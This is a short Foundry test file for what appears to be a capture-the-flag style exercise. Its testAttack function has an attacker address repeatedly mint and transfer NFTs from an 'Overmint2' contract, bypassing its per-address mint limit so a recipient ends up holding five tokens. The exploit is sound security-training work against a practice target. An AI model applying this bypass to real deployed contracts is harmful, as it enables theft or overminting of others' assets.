// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Overmint2.sol";
import "forge-std/src/Test.sol";

contract Overmint2Test is Test {
    Overmint2 private overmint;
    address private recipient;
    address private attacker;

    function setUp() public {
        overmint = new Overmint2();
        attacker = makeAddr("attacker"); // Create a proper attacker address
        recipient = makeAddr("recipient"); // Create a proper recipient address
    }

    function testAttack() public {
        vm.startPrank(attacker);
        
        // Mint 5 tokens
        for (uint256 i = 1; i <= 5; i++) {
            overmint.mint();
            overmint.transferFrom(attacker, recipient, i);
        }

        vm.stopPrank();

        // Check if attack was successful
        vm.prank(recipient);
        assertEq(overmint.balanceOf(recipient), 5, "Recipient should have exactly 5 NFTs");
    }
}